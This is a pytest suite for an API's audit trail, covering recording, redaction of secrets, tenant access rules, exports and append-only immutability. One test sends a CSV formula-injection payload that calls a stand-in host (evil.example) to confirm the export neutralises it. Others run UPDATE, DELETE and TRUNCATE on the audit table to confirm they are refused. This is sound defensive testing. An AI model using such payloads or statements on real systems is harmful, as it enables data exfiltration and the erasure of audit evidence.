"""The administrative audit trail: what is recorded, who may read it, and that
the rows cannot be rewritten (#327, #329).

Postgres-gated like the rest of the API suite — and more than usually so: the
immutability this asserts is a trigger migration 0037 installs, and the SQLite
dev fallback has neither trigger nor the privileged prune function.

What the tests are shaped around is the two ways an audit trail fails. It can
fail to record (a change with no row, or a row without the actor, address or
request id that make it useful), and it can record too much (a token plaintext
or an API key sitting in ``after`` for every tenant admin to read). Both have a
test; so does the third failure, a trail the application can quietly edit.
"""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import text

from api.db.engine import get_session
from api.services import audit as audit_service
from api.services import audit_retention
from tests.conftest import (
    auth_headers,
    configured_client,
    make_settings,
    requires_postgres,
)

pytestmark = requires_postgres

# The header the trail copies into ``request_id``. Nothing invents one: the
# value in a row always matches a value that was on the wire.
REQUEST_ID = "req-audit-0001"


@pytest.fixture
def env(tmp_path, monkeypatch):
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin = {**auth_headers(client, "admin"), "X-Request-Id": REQUEST_ID}
    return client, settings, admin


def events(client, headers, **params) -> list[dict]:
    response = client.get("/api/audit", headers=headers, params=params)
    assert response.status_code == 200, response.text
    return response.json()["items"]


def actions(client, headers, **params) -> list[str]:
    return [event["action"] for event in events(client, headers, **params)]


# --------------------------------------------------------------------------- #
# What gets recorded
# --------------------------------------------------------------------------- #


def test_the_user_lifecycle_is_recorded_end_to_end(env):
    client, _settings, admin = env

    created = client.post(
        "/api/users",
        headers=admin,
        json={"username": "amy", "password": "correct-horse-1", "role": "viewer"},
    )
    assert created.status_code == 201, created.text
    assert (
        client.put("/api/users/amy/role", headers=admin, json={"role": "operator"}).status_code
        == 200
    )
    assert (
        client.put(
            "/api/users/amy/disabled", headers=admin, json={"disabled": True}
        ).status_code
        == 200
    )
    assert client.delete("/api/users/amy", headers=admin).status_code == 204

    recorded = events(client, admin, resource_type="user", resource_id="amy")
    assert [event["action"] for event in recorded] == [
        "user.delete",
        "user.disable",
        "user.role_change",
        "user.create",
    ], "newest first, one row per change"

    role_change = next(e for e in recorded if e["action"] == "user.role_change")
    assert role_change["before"] == {"role": "viewer"}
    assert role_change["after"] == {"role": "operator"}
    # The four facts a review needs beyond the change itself.
    assert role_change["actor"] == "admin"
    assert role_change["actor_type"] == "user"
    assert role_change["client_ip"]
    assert role_change["request_id"] == REQUEST_ID
    # A console account belongs to no tenant, so neither does the record of it.
    assert role_change["tenant_id"] is None

    deleted = next(e for e in recorded if e["action"] == "user.delete")
    assert deleted["before"]["username"] == "amy"
    assert deleted["after"] is None


def test_a_request_without_the_header_records_no_request_id(env):
    client, _settings, admin = env
    headers = {key: value for key, value in admin.items() if key != "X-Request-Id"}
    assert (
        client.post(
            "/api/users",
            headers=headers,
            json={"username": "bo", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )
    [event] = events(client, admin, resource_id="bo")
    assert event["request_id"] is None


def test_memberships_scan_scope_and_config_are_recorded(env, tmp_path):
    client, _settings, admin = env
    assert (
        client.post("/api/tenants", headers=admin, json={"name": "Acme", "tenant_id": "acme"})
        .status_code
        == 201
    )
    assert (
        client.post(
            "/api/users",
            headers=admin,
            json={"username": "cara", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )
    assert (
        client.put(
            "/api/tenants/acme/members/cara", headers=admin, json={"role": "operator"}
        ).status_code
        == 200
    )
    assert client.delete("/api/tenants/acme/members/cara", headers=admin).status_code == 204
    assert (
        client.put(
            "/api/tenants/acme/scan-scope",
            headers=admin,
            json={"entries": [{"effect": "allow", "kind": "cidr", "value": "10.0.0.0/8"}]},
        ).status_code
        == 200
    )
    assert (
        client.put(
            "/api/config",
            headers=admin,
            json={"overrides": {"enrichment.cvss4.nvd_api_key": "nvd-secret-value"}},
        ).status_code
        == 200
    )

    in_tenant = actions(client, admin, tenant_id="acme")
    assert in_tenant == ["scan_scope.replace", "membership.revoke", "membership.grant"]

    # Scoped to acme: the suite's own fixtures approve a scope for ``default``
    # through the service layer, which records it as a ``system`` actor.
    # A diff, not two whole scopes: what moved is the reviewable fact, and a
    # tenant with thousands of entries would otherwise push the pair past the
    # document cap and be stored as ``{"truncated": true}``.
    [scope] = events(client, admin, action="scan_scope.replace", tenant_id="acme")
    assert scope["before"] == {"removed": [], "entry_count": 0}
    assert scope["after"]["entry_count"] == 1
    assert scope["after"]["added"][0]["value"] == "10.0.0.0/8"

    # The config override is installation-wide, so it carries no tenant and is
    # not in the tenant listing above. Recorded as the dot-paths that changed,
    # with "[unset]" on the side where the path was not overridden at all.
    [config] = events(client, admin, action="config.update")
    assert config["tenant_id"] is None
    assert "nvd-secret-value" not in json.dumps(config)
    # Both sides redacted: the rule keys on the field name, so even the
    # "[unset]" marker on the before side is replaced. That a secret path
    # changed is the fact worth keeping; its old value is not.
    assert config["before"] == {"enrichment.cvss4.nvd_api_key": audit_service.REDACTED}
    assert config["after"] == {"enrichment.cvss4.nvd_api_key": audit_service.REDACTED}


def test_a_scope_replace_records_the_diff_not_both_scopes(env):
    """Two full scopes was the first shape of this, and it scaled badly.

    A tenant with a few thousand entries pushed the pair past the audit table's
    16 KiB document cap, where it became ``{"truncated": true}`` — a row saying
    the scope changed and refusing to say how. The diff is bounded by the change
    instead, and is also what a review actually reads.
    """
    client, _settings, admin = env
    assert (
        client.post("/api/tenants", headers=admin, json={"name": "Zeta", "tenant_id": "zeta"})
        .status_code
        == 201
    )
    keep = {"effect": "allow", "kind": "cidr", "value": "10.0.0.0/8"}
    drop = {"effect": "allow", "kind": "domain", "value": "old.example.com"}
    add = {"effect": "deny", "kind": "domain", "value": "new.example.com"}
    for entries in ([keep, drop], [keep, add]):
        assert (
            client.put(
                "/api/tenants/zeta/scan-scope", headers=admin, json={"entries": entries}
            ).status_code
            == 200
        )

    second, _first = events(client, admin, action="scan_scope.replace", tenant_id="zeta")
    assert [entry["value"] for entry in second["before"]["removed"]] == ["old.example.com"]
    assert [entry["value"] for entry in second["after"]["added"]] == ["new.example.com"]
    # The entry nobody touched is in neither side, even though the replace
    # deleted and re-inserted its row with a new id and a new approved_at.
    assert "10.0.0.0/8" not in json.dumps(second)
    assert second["before"]["entry_count"] == second["after"]["entry_count"] == 2


def test_password_resets_and_self_rotations_are_recorded_apart(env):
    """The reset is a takeover in one request; the rotation is routine.

    Recorded under different actions for that reason — folding an admin's reset
    of somebody else's account in with every user's own rotation is how it stops
    being the row anyone looks at. Neither carries the password, in either
    direction.
    """
    client, _settings, admin = env
    assert (
        client.post(
            "/api/users",
            headers=admin,
            json={"username": "rex", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )
    assert (
        client.put(
            "/api/users/rex/password", headers=admin, json={"password": "set-by-the-admin-9"}
        ).status_code
        == 200
    )
    rex = auth_headers(client, "rex", "set-by-the-admin-9")
    assert (
        client.post(
            "/api/auth/password",
            headers=rex,
            json={
                "current_password": "set-by-the-admin-9",
                "new_password": "chosen-by-rex-77",
            },
        ).status_code
        == 204
    )

    [reset] = events(client, admin, action=audit_service.ACTION_USER_PASSWORD_RESET)
    assert reset["actor"] == "admin"
    assert reset["resource_id"] == "rex"
    # The timestamp that moved, not the value that was set.
    assert reset["before"]["password_changed_at"] != reset["after"]["password_changed_at"]

    [rotated] = events(client, admin, action=audit_service.ACTION_USER_PASSWORD_CHANGE)
    assert rotated["actor"] == "rex"

    trail = json.dumps(events(client, admin, limit=200))
    assert "set-by-the-admin-9" not in trail
    assert "chosen-by-rex-77" not in trail


def test_credentials_never_reach_the_trail(env):
    """The failure mode that would make this table worse than no table at all."""
    client, _settings, admin = env
    token = client.post(
        "/api/tenants/default/service-tokens",
        headers=admin,
        json={"name": "ci", "scopes": ["runs:read"], "role": "viewer"},
    )
    assert token.status_code == 201, token.text
    plaintext = token.json()["token"]

    key = client.post(
        "/api/tenants/default/provisioning-keys", headers=admin, json={"label": "lab"}
    )
    assert key.status_code == 201, key.text
    key_plaintext = key.json()["key"]

    trail = json.dumps(events(client, admin, tenant_id="default"))
    assert plaintext not in trail
    assert key_plaintext not in trail
    assert audit_service.ACTION_SERVICE_TOKEN_CREATE in trail

    [recorded_key] = events(client, admin, action="provisioning_key.create")
    # Present, and empty of the thing it names: the trail says which key was
    # minted, and nothing about what to present.
    assert recorded_key["after"]["key_id"] == key.json()["key_id"]
    assert "key" not in recorded_key["after"]
    assert "key_hash" not in recorded_key["after"]

    [recorded_token] = events(client, admin, action="service_token.create")
    assert recorded_token["after"]["token_prefix"] == token.json()["token_prefix"]
    assert "token" not in recorded_token["after"]


def test_revoking_a_token_twice_records_one_change(env):
    client, _settings, admin = env
    token = client.post(
        "/api/tenants/default/service-tokens",
        headers=admin,
        json={"name": "ci", "scopes": ["runs:read"], "role": "viewer"},
    ).json()
    path = f"/api/tenants/default/service-tokens/{token['token_id']}/revoke"
    assert client.post(path, headers=admin).status_code == 200
    assert client.post(path, headers=admin).status_code == 200

    assert actions(client, admin, action="service_token.revoke") == ["service_token.revoke"]


def test_agent_registration_is_recorded_once_as_the_agent(tmp_path, monkeypatch):
    client = configured_client(tmp_path, monkeypatch, job_execution_mode="agent")
    agent = {"Authorization": "Bearer test-agent-token"}
    first = client.post("/api/agent/register", headers=agent, json={"hostname": "edge-1"})
    assert first.status_code == 200, first.text
    agent_id = first.json()["agent_id"]
    # A restart re-registers. That is uptime, not an administrative change.
    assert (
        client.post(
            "/api/agent/register",
            headers=agent,
            json={"agent_id": agent_id, "hostname": "edge-1"},
        ).status_code
        == 200
    )

    admin = auth_headers(client, "admin")
    recorded = events(client, admin, action="agent.register")
    assert len(recorded) == 1
    assert recorded[0]["actor_type"] == "agent"
    assert recorded[0]["resource_id"] == agent_id
    assert recorded[0]["tenant_id"] == "default"



def test_agent_lifecycle_changes_are_recorded_one_action_per_state(tmp_path, monkeypatch):
    """A quarantine and the release from it are two actions, not two rows of one.

    "Who took this host out of the fleet" is the question the trail is read
    for, and an operator asks it as a filter on the action.
    """
    client = configured_client(tmp_path, monkeypatch, job_execution_mode="agent")
    agent = {"Authorization": "Bearer test-agent-token"}
    agent_id = client.post(
        "/api/agent/register", headers=agent, json={"hostname": "edge-1"}
    ).json()["agent_id"]
    admin = {**auth_headers(client, "admin"), "X-Request-Id": REQUEST_ID}

    quarantined = client.patch(
        f"/api/agents/{agent_id}",
        headers=admin,
        json={"status": "quarantined", "reason": "beaconing to 203.0.113.7"},
    )
    assert quarantined.status_code == 200, quarantined.text
    released = client.patch(f"/api/agents/{agent_id}", headers=admin, json={"status": "active"})
    assert released.status_code == 200, released.text

    [recorded_quarantine] = events(client, admin, action="agent.quarantine")
    assert recorded_quarantine["actor"] == "admin"
    assert recorded_quarantine["actor_type"] == "user"
    assert recorded_quarantine["resource_id"] == agent_id
    assert recorded_quarantine["tenant_id"] == "default"
    assert recorded_quarantine["request_id"] == REQUEST_ID
    assert recorded_quarantine["before"]["lifecycle_status"] == "active"
    assert recorded_quarantine["after"] == {
        "lifecycle_status": "quarantined",
        "reason": "beaconing to 203.0.113.7",
    }

    [recorded_release] = events(client, admin, action="agent.enable")
    assert recorded_release["before"]["lifecycle_status"] == "quarantined"
    assert recorded_release["after"]["reason"] == ""
    assert actions(client, admin, action="agent.disable") == []


def test_deleting_an_agent_records_what_was_removed(tmp_path, monkeypatch):
    client = configured_client(tmp_path, monkeypatch, job_execution_mode="agent")
    agent = {"Authorization": "Bearer test-agent-token"}
    agent_id = client.post(
        "/api/agent/register", headers=agent, json={"hostname": "edge-1"}
    ).json()["agent_id"]
    operator = auth_headers(client, "operator")
    assert client.delete(f"/api/agents/{agent_id}", headers=operator).status_code == 200

    admin = auth_headers(client, "admin")
    [recorded] = events(client, admin, action="agent.delete")
    assert recorded["actor"] == "operator"
    assert recorded["resource_id"] == agent_id
    assert recorded["tenant_id"] == "default"
    assert recorded["before"]["hostname"] == "edge-1"
    assert recorded["before"]["lifecycle_status"] == "active"
    # A legacy shared-token agent has no key on record, and the trail says so
    # rather than leaving the field out.
    assert recorded["before"]["provisioning_key_id"] == ""
    # The row outlives the agent: the trail is read after the resource is gone.
    assert client.get(f"/api/agents/{agent_id}", headers=admin).status_code == 404


def test_delete_with_revoke_key_records_the_agent_and_the_key(tmp_path, monkeypatch):
    """Two acts on two resources, under one actor and one request id (#308).

    The key survives the agent -- it commonly provisions a whole fleet -- so
    its revocation is its own row rather than a field on the delete.
    """
    client = configured_client(
        tmp_path, monkeypatch, job_execution_mode="agent", agent_token=""
    )
    admin = {**auth_headers(client, "admin"), "X-Request-Id": REQUEST_ID}
    minted = client.post(
        "/api/tenants/default/provisioning-keys", headers=admin, json={"label": "fleet-a"}
    )
    assert minted.status_code == 201, minted.text
    key = minted.json()
    exchanged = client.post(
        "/api/auth/agent/token",
        json={"provisioning_key": key["key"], "agent_id": "agent_one"},
    )
    assert exchanged.status_code == 200, exchanged.text
    agent = {"Authorization": f"Bearer {exchanged.json()['access_token']}"}
    assert (
        client.post("/api/agent/register", headers=agent, json={"hostname": "edge-1"}).status_code
        == 200
    )

    operator = {**auth_headers(client, "operator"), "X-Request-Id": REQUEST_ID}
    deleted = client.delete("/api/agents/agent_one?revoke_key=true", headers=operator)
    assert deleted.status_code == 200, deleted.text
    assert deleted.json()["key_revoked"] is True

    [recorded_agent] = events(client, admin, action="agent.delete")
    assert recorded_agent["before"]["provisioning_key_id"] == key["key_id"]
    [recorded_key] = events(client, admin, action="provisioning_key.revoke")
    assert recorded_key["resource_id"] == key["key_id"]
    assert recorded_key["actor"] == "operator"
    assert recorded_key["request_id"] == REQUEST_ID
    # The key's plaintext is never in the trail, only the prefix it is found by.
    assert "key" not in recorded_key["after"]


def test_downloading_a_report_is_recorded(tmp_path, monkeypatch):
    client = configured_client(tmp_path, monkeypatch)
    operator = auth_headers(client, "operator")
    generated = client.post(
        "/api/reports/generate", headers=operator, json={"kind": "executive", "format": "json"}
    )
    assert generated.status_code == 200, generated.text
    report_id = generated.json()["report_id"]

    admin = auth_headers(client, "admin")
    assert not events(client, admin, action="report.download")
    assert (
        client.get(f"/api/reports/{report_id}/download", headers=operator).status_code == 200
    )
    [download] = events(client, admin, action="report.download")
    assert download["actor"] == "operator"
    assert download["resource_id"] == report_id
    assert download["tenant_id"] == "default"


# --------------------------------------------------------------------------- #
# Who may read it
# --------------------------------------------------------------------------- #


def test_a_tenant_admin_sees_only_their_own_tenant(env):
    client, _settings, admin = env
    for tenant_id, name in (("acme", "Acme"), ("globex", "Globex")):
        assert (
            client.post("/api/tenants", headers=admin, json={"name": name, "tenant_id": tenant_id})
            .status_code
            == 201
        )
    assert (
        client.post(
            "/api/users",
            headers=admin,
            json={"username": "dana", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )
    # dana administers acme and nothing else.
    for tenant_id in ("acme", "globex"):
        assert (
            client.put(
                f"/api/tenants/{tenant_id}/members/dana",
                headers=admin,
                json={"role": "admin" if tenant_id == "acme" else "viewer"},
            ).status_code
            == 200
        )
    assert (
        client.put(
            "/api/tenants/globex/scan-scope",
            headers=admin,
            json={"entries": [{"effect": "allow", "kind": "cidr", "value": "10.0.0.0/8"}]},
        ).status_code
        == 200
    )

    dana = auth_headers(client, "dana", "correct-horse-1")
    seen = events(client, dana, tenant_id="acme")
    assert seen and {event["tenant_id"] for event in seen} == {"acme"}
    # Platform-level acts (the account creations above) carry no tenant and are
    # therefore in nobody's tenant-scoped answer.
    assert "user.create" not in [event["action"] for event in seen]
    # The other tenant is a 403, not a filtered-to-empty 200.
    assert client.get("/api/audit", headers=dana, params={"tenant_id": "globex"}).status_code == 403
    # A viewer in acme is not an admin anywhere.
    assert client.get("/api/audit", headers=dana, params={"tenant_id": "acme"}).status_code == 200

    # The platform admin's unfiltered answer spans both tenants and the
    # platform-level rows.
    everything = events(client, admin, limit=200)
    assert {event["tenant_id"] for event in everything} >= {None, "acme", "globex"}


def test_an_operator_may_not_read_the_trail(env):
    client, _settings, _admin = env
    operator = auth_headers(client, "operator")
    assert client.get("/api/audit", headers=operator).status_code == 403


# --------------------------------------------------------------------------- #
# Filters and export
# --------------------------------------------------------------------------- #


def test_the_time_window_filters_both_ends(env):
    client, _settings, admin = env
    assert (
        client.post(
            "/api/users",
            headers=admin,
            json={"username": "eve", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )
    now = datetime.now(UTC)
    recent = (now - timedelta(minutes=5)).isoformat()
    ancient = (now - timedelta(days=2)).isoformat()

    assert actions(client, admin, resource_id="eve", **{"from": recent}) == ["user.create"]
    assert actions(client, admin, resource_id="eve", to=ancient) == []


def test_the_export_streams_every_matching_row(env):
    client, _settings, admin = env
    for name in ("fay", "gus", "hal"):
        assert (
            client.post(
                "/api/users",
                headers=admin,
                json={"username": name, "password": "correct-horse-1", "role": "viewer"},
            ).status_code
            == 201
        )

    # ``limit`` bounds the page, never the export: an export bounded by a page
    # size is a page with a filename.
    csv_export = client.get(
        "/api/audit", headers=admin, params={"format": "csv", "action": "user.create", "limit": 1}
    )
    assert csv_export.status_code == 200
    assert csv_export.headers["content-type"].startswith("text/csv")
    assert "attachment" in csv_export.headers["content-disposition"]
    lines = [line for line in csv_export.text.splitlines() if line.strip()]
    assert lines[0].startswith("id,occurred_at,tenant_id,actor")
    assert len(lines) == 4  # header + three creations

    ndjson = client.get(
        "/api/audit", headers=admin, params={"format": "ndjson", "action": "user.create"}
    )
    assert ndjson.status_code == 200
    assert ndjson.headers["content-type"].startswith("application/x-ndjson")
    rows = [json.loads(line) for line in ndjson.text.splitlines() if line.strip()]
    assert {row["resource_id"] for row in rows} == {"fay", "gus", "hal"}
    assert all(row["action"] == "user.create" for row in rows)


def test_the_csv_export_does_not_hand_a_spreadsheet_a_formula(env):
    r"""Almost every column here is attacker-influenced.

    An agent picks its own id, a viewer picks their ``User-Agent``, and a
    ``resource_id`` is whatever was named in the request. The export exists to
    be opened in a spreadsheet by someone reviewing an incident, which is the
    worst possible place to feed the formula parser — so a cell starting with
    one of ``= + - @ \t \r`` is prefixed with an apostrophe.
    """
    client, _settings, admin = env
    hostile = {
        **admin,
        "User-Agent": '=HYPERLINK("https://evil.example/"&A1,"click")',
    }
    assert (
        client.post(
            "/api/users",
            headers=hostile,
            json={"username": "sue", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )

    export = client.get(
        "/api/audit", headers=admin, params={"format": "csv", "resource_id": "sue"}
    )
    assert export.status_code == 200
    [row] = [
        line for line in export.text.splitlines()[1:] if line.strip()
    ]
    assert "'=HYPERLINK" in row
    # And nowhere does a bare formula survive: every quoted cell in the row
    # that carries the payload has the apostrophe in front of the '='.
    assert ',=HYPERLINK' not in row
    assert '"=HYPERLINK' not in row

    # NDJSON is untouched — it is JSON, and nothing evaluates it.
    ndjson = client.get(
        "/api/audit", headers=admin, params={"format": "ndjson", "resource_id": "sue"}
    )
    [event] = [json.loads(line) for line in ndjson.text.splitlines() if line.strip()]
    assert event["user_agent"].startswith("=HYPERLINK")


def test_the_export_reader_pages_with_a_keyset_not_an_offset(env):
    """The batch boundary, which the HTTP tests above never cross."""
    client, _settings, admin = env
    for name in ("lee", "moe", "ned", "oli", "pat"):
        assert (
            client.post(
                "/api/users",
                headers=admin,
                json={"username": name, "password": "correct-horse-1", "role": "viewer"},
            ).status_code
            == 201
        )

    streamed = list(
        audit_service.iter_events(action=audit_service.ACTION_USER_CREATE, batch_size=2)
    )
    assert [event["resource_id"] for event in streamed] == ["pat", "oli", "ned", "moe", "lee"]
    # Newest first, and every row exactly once — an offset-paged reader would
    # repeat or skip across batches as rows are inserted underneath it.
    assert len({event["id"] for event in streamed}) == 5


# --------------------------------------------------------------------------- #
# Immutability (#329)
# --------------------------------------------------------------------------- #


def test_the_trail_refuses_update_and_delete(env):
    client, settings, admin = env
    assert (
        client.post(
            "/api/users",
            headers=admin,
            json={"username": "ivy", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )

    for statement in (
        "UPDATE audit_events SET actor = 'nobody'",
        "DELETE FROM audit_events",
    ):
        with pytest.raises(Exception) as refused:
            with get_session(settings.postgres_url) as session:
                session.execute(text(statement))
        assert "append-only" in str(refused.value)

    # And the row is still there, unedited.
    [event] = events(client, admin, resource_id="ivy")
    assert event["actor"] == "admin"


def test_the_trail_refuses_truncate(env):
    """The statement the row triggers never see.

    ``TRUNCATE`` does not fire a ``FOR EACH ROW`` trigger at all, so the
    UPDATE/DELETE guards above are blind to it and one statement would empty the
    whole trail — with the escape hatch's GUC not even needed.
    """
    client, settings, admin = env
    assert (
        client.post(
            "/api/users",
            headers=admin,
            json={"username": "tom", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )

    for statement in (
        "TRUNCATE audit_events",
        # Not reachable through the retention function either: it deletes by
        # age, and nothing in this project wants the table gone.
        "SET LOCAL shapoclyack.audit_retention = 'on'; TRUNCATE audit_events",
    ):
        with pytest.raises(Exception) as refused:
            with get_session(settings.postgres_url) as session:
                for part in statement.split("; "):
                    session.execute(text(part))
        assert "append-only" in str(refused.value)

    assert actions(client, admin, resource_id="tom") == ["user.create"]


def test_a_rolled_back_change_leaves_no_row(env):
    """The other half of "the row commits with the change".

    The suite already asserts that a change which succeeds is recorded. This is
    the direction that would make the trail *lie* rather than merely lose: a
    request that dies after :func:`audit.record` has added its row must take the
    row down with the change, because both live in one session and one
    transaction. Simulated by failing the instant the row is added — there is no
    code between that point and the commit to fail on its own.
    """
    client, _settings, admin = env
    original = audit_service.record

    def record_then_die(session, context, **kwargs):
        original(session, context, **kwargs)
        raise RuntimeError("boom, with the audit row already in the session")

    # Swapped by hand rather than through ``monkeypatch``: the ``env`` fixture
    # built its client with the same monkeypatch instance, so undoing this one
    # patch early would also undo the environment that client authenticates
    # against — and every later request in the test would 401.
    audit_service.record = record_then_die
    try:
        with pytest.raises(RuntimeError):
            client.post(
                "/api/users",
                headers=admin,
                json={"username": "una", "password": "correct-horse-1", "role": "viewer"},
            )
    finally:
        audit_service.record = original

    # Neither the account nor a row claiming it was created.
    listed = client.get("/api/users", headers=admin)
    assert listed.status_code == 200
    assert "una" not in [user["username"] for user in listed.json()]
    assert actions(client, admin, resource_id="una") == []


def test_retention_prunes_through_the_privileged_function(env):
    client, settings, admin = env
    assert (
        client.post(
            "/api/users",
            headers=admin,
            json={"username": "jan", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )
    # Age the row past the window. Written with the prune function's own escape
    # hatch closed to us, so it goes in as a second row rather than an edit.
    with get_session(settings.postgres_url) as session:
        session.execute(
            text(
                "INSERT INTO audit_events "
                "(occurred_at, actor, actor_type, action, resource_type, resource_id, "
                "client_ip, user_agent) "
                "VALUES (:occurred_at, 'admin', 'user', 'user.create', 'user', 'old', '', '')"
            ),
            {"occurred_at": datetime.now(UTC).replace(tzinfo=None) - timedelta(days=400)},
        )

    settings.audit_event_retention_days = 365
    removed = audit_retention.sweep(settings)
    assert removed == 1

    remaining = [event["resource_id"] for event in events(client, admin, limit=200)]
    assert "old" not in remaining
    assert "jan" in remaining


def test_retention_disabled_keeps_everything(env):
    client, settings, admin = env
    assert (
        client.post(
            "/api/users",
            headers=admin,
            json={"username": "kim", "password": "correct-horse-1", "role": "viewer"},
        ).status_code
        == 201
    )
    settings.audit_event_retention_days = 0
    assert audit_retention.sweep(settings) == 0
    assert actions(client, admin, resource_id="kim") == ["user.create"]
